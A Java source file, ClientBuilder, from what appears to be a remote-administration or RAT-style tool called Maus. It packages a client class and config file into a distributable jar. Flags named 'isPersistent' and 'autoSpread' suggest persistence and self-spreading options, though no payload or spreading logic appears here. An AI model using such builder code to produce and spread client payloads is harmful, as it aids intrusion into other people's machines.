package Maus;

import Logger.Level;
import Logger.Logger;
import Server.Data.FileUtils;
import Server.Data.PseudoBase;

import java.awt.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

public class ClientBuilder {
    public static boolean isPersistent = false;
    public static boolean autoSpread = false;
    private String clientName;

    public ClientBuilder(String clientName) {
        this.clientName = clientName;
        try {
            PseudoBase.writeMausData();
        } catch (IOException e) {
            Logger.log(Level.ERROR, e.toString());
        }
    }

    public void run() throws IOException {
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
        manifest.getMainAttributes().put(new Attributes.Name("Created-By"), "Maus");
        manifest.getMainAttributes().put(Attributes.Name.CLASS_PATH, ".");
        manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, "Client.Client");

        String jarFileName = System.getProperty("user.home") + "/Maus/" + clientName + ".jar";
        File jarFile = new File(jarFileName);
        try {
            byte buffer[] = new byte[1024];
            FileOutputStream stream = new FileOutputStream(jarFile);
            JarOutputStream out = new JarOutputStream(stream, manifest);
            ArrayList<File> fileList = new ArrayList<>();
            try {
                FileUtils.ExportResource("/Client/Client.class");
                Thread.sleep(2000);
            } catch (Exception e) {
                Logger.log(Level.ERROR, e.toString());
            }
            fileList.add(new File(System.getProperty("user.home").replace("\\", "/") + "/Maus/Client/Client.class"));
            fileList.add(new File(System.getProperty("user.home").replace("\\", "/") + "/Maus/.mauscs"));

            for (File file : fileList) {
                if (file == null) {
                } else {
                    if (file.isDirectory()) {
                        JarEntry jar = new JarEntry(file.getName() + "/");
                        jar.setTime(file.lastModified());
                        out.putNextEntry(jar);
                        out.closeEntry();
                    } else {
                        JarEntry jar = new JarEntry("Client/" + file.getName());
                        jar.setTime(file.lastModified());
                        out.putNextEntry(jar);
                        FileInputStream in = new FileInputStream(file);
                        while (true) {
                            int nRead = in.read(buffer, 0, buffer.length);
                            if (nRead <= 0) {
                                break;
                            }
                            out.write(buffer, 0, nRead);
                        }
                        out.closeEntry();
                        in.close();
                    }
                }
            }
            out.close();
            stream.close();
            Desktop.getDesktop().open(new File(System.getProperty("user.home") + "/Maus/"));
            Logger.log(Level.INFO, "Build Complete!");
            FileUtils.deleteFiles();
        } catch (Exception e) {
            Logger.log(Level.ERROR, e.toString());
        }
    }
}
